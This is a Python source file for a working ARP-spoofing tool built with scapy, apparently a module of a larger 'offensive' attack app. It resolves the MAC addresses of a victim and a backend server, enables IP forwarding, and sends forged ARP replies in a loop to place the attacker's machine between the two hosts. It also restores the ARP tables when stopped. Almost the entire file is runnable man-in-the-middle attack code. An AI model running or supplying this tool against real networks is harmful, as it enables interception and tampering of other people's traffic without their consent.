import os
import signal
import sys
import threading
import time

from scapy.all import ARP, Ether, get_if_hwaddr, sendp, srp

from config.constants import (
    IFACE,
    VICTIM_IP,
    SERVER_IP,
    SPOOF_INTERVAL,
)
from offensive.packet_forwarder import enable_forwarding, restore_forwarding


stop_requested = False


def require_root():
    if os.geteuid() != 0:
        sys.exit("Error: run with sudo. ARP spoofing requires raw socket access.")


def handle_stop_signal(signum, frame):
    global stop_requested
    stop_requested = True
    print("\n[*] Stop requested. Restoring ARP tables...")


def get_mac(ip: str, iface: str, timeout: float = 2.0) -> str | None:
    """
    Resolve MAC address for an IP using ARP who-has.
    """
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)

    answered, _ = srp(
        packet,
        iface=iface,
        timeout=timeout,
        retry=2,
        verbose=0,
    )

    for _, received in answered:
        return received.hwsrc.lower()

    return None


def build_spoof_packet(target_ip: str, target_mac: str, spoof_ip: str, attacker_mac: str):
    """
    Builds an ARP reply telling target_ip:
    'spoof_ip is at attacker_mac'
    """
    return (
        Ether(dst=target_mac)
        / ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip,
            hwsrc=attacker_mac,
        )
    )


def build_restore_packet(target_ip: str, target_mac: str, real_ip: str, real_mac: str):
    """
    Builds a corrective ARP reply telling target_ip:
    'real_ip is at real_mac'
    """
    return (
        Ether(dst=target_mac)
        / ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=real_ip,
            hwsrc=real_mac,
        )
    )


def poison(victim_mac: str, server_mac: str, attacker_mac: str):
    """
    Continuously poisons victim <-> backend server ARP mappings.
    """
    victim_packet = build_spoof_packet(
        target_ip=VICTIM_IP,
        target_mac=victim_mac,
        spoof_ip=SERVER_IP,
        attacker_mac=attacker_mac,
    )

    server_packet = build_spoof_packet(
        target_ip=SERVER_IP,
        target_mac=server_mac,
        spoof_ip=VICTIM_IP,
        attacker_mac=attacker_mac,
    )

    print("[+] ARP spoofing started")
    print(f"[*] Victim:         {VICTIM_IP} ({victim_mac})")
    print(f"[*] Backend server: {SERVER_IP} ({server_mac})")
    print(f"[*] Attacker MAC:   {attacker_mac}")
    print("[*] Press Ctrl+C to stop and restore ARP tables")
    print()

    while not stop_requested:
        sendp(victim_packet, iface=IFACE, verbose=0)
        sendp(server_packet, iface=IFACE, verbose=0)
        time.sleep(SPOOF_INTERVAL)


def poison_runtime(
    *,
    iface: str,
    victim_ip: str,
    server_ip: str,
    victim_mac: str,
    server_mac: str,
    attacker_mac: str,
    spoof_interval: int,
    stop_event: threading.Event,
) -> None:
    victim_packet = build_spoof_packet(
        target_ip=victim_ip,
        target_mac=victim_mac,
        spoof_ip=server_ip,
        attacker_mac=attacker_mac,
    )

    server_packet = build_spoof_packet(
        target_ip=server_ip,
        target_mac=server_mac,
        spoof_ip=victim_ip,
        attacker_mac=attacker_mac,
    )

    print("[+] ARP spoofing started")
    print(f"[*] Victim:         {victim_ip} ({victim_mac})")
    print(f"[*] Backend server: {server_ip} ({server_mac})")
    print(f"[*] Attacker MAC:   {attacker_mac}")
    print("[*] Use the attack app panic stop to restore ARP tables")
    print()

    while not stop_event.is_set():
        sendp(victim_packet, iface=iface, verbose=0)
        sendp(server_packet, iface=iface, verbose=0)
        stop_event.wait(spoof_interval)


def restore(victim_mac: str, server_mac: str, count: int = 5):
    """
    Restores correct ARP mappings for both victim and backend server.
    """
    print("[*] Restoring victim and backend server ARP tables...")

    restore_victim = build_restore_packet(
        target_ip=VICTIM_IP,
        target_mac=victim_mac,
        real_ip=SERVER_IP,
        real_mac=server_mac,
    )

    restore_server = build_restore_packet(
        target_ip=SERVER_IP,
        target_mac=server_mac,
        real_ip=VICTIM_IP,
        real_mac=victim_mac,
    )

    for _ in range(count):
        sendp(restore_victim, iface=IFACE, verbose=0)
        sendp(restore_server, iface=IFACE, verbose=0)
        time.sleep(0.5)

    print("[+] ARP restore packets sent")


def restore_runtime(
    *,
    iface: str,
    victim_ip: str,
    server_ip: str,
    victim_mac: str,
    server_mac: str,
    count: int = 5,
) -> None:
    print("[*] Restoring victim and backend server ARP tables...")

    restore_victim = build_restore_packet(
        target_ip=victim_ip,
        target_mac=victim_mac,
        real_ip=server_ip,
        real_mac=server_mac,
    )

    restore_server = build_restore_packet(
        target_ip=server_ip,
        target_mac=server_mac,
        real_ip=victim_ip,
        real_mac=victim_mac,
    )

    for _ in range(count):
        sendp(restore_victim, iface=iface, verbose=0)
        sendp(restore_server, iface=iface, verbose=0)
        time.sleep(0.5)

    print("[+] ARP restore packets sent")


def run_spoofer(
    *,
    iface: str,
    victim_ip: str,
    server_ip: str,
    spoof_interval: int,
    stop_event: threading.Event,
    ready_event: threading.Event | None = None,
) -> None:
    require_root()

    print("[*] Resolving target MAC addresses...")
    victim_mac = get_mac(victim_ip, iface)
    server_mac = get_mac(server_ip, iface)
    attacker_mac = get_if_hwaddr(iface).lower()

    if not victim_mac:
        raise RuntimeError(f"Could not resolve victim MAC for {victim_ip}")

    if not server_mac:
        raise RuntimeError(f"Could not resolve backend server MAC for {server_ip}")

    original_forwarding = None

    try:
        original_forwarding = enable_forwarding()
        if ready_event is not None:
            ready_event.set()
        poison_runtime(
            iface=iface,
            victim_ip=victim_ip,
            server_ip=server_ip,
            victim_mac=victim_mac,
            server_mac=server_mac,
            attacker_mac=attacker_mac,
            spoof_interval=spoof_interval,
            stop_event=stop_event,
        )
    finally:
        restore_runtime(
            iface=iface,
            victim_ip=victim_ip,
            server_ip=server_ip,
            victim_mac=victim_mac,
            server_mac=server_mac,
        )

        if original_forwarding is not None:
            restore_forwarding(original_forwarding)

        print("[+] Spoofer stopped cleanly")


def main():
    require_root()

    signal.signal(signal.SIGINT, handle_stop_signal)
    signal.signal(signal.SIGTERM, handle_stop_signal)

    print("[*] Resolving target MAC addresses...")
    victim_mac = get_mac(VICTIM_IP, IFACE)
    server_mac = get_mac(SERVER_IP, IFACE)
    attacker_mac = get_if_hwaddr(IFACE).lower()

    if not victim_mac:
        sys.exit(f"Error: could not resolve victim MAC for {VICTIM_IP}")

    if not server_mac:
        sys.exit(f"Error: could not resolve backend server MAC for {SERVER_IP}")

    original_forwarding = None

    try:
        original_forwarding = enable_forwarding()
        poison(victim_mac, server_mac, attacker_mac)
    finally:
        restore(victim_mac, server_mac)

        if original_forwarding is not None:
            restore_forwarding(original_forwarding)

        print("[+] Spoofer stopped cleanly")


if __name__ == "__main__":
    main()
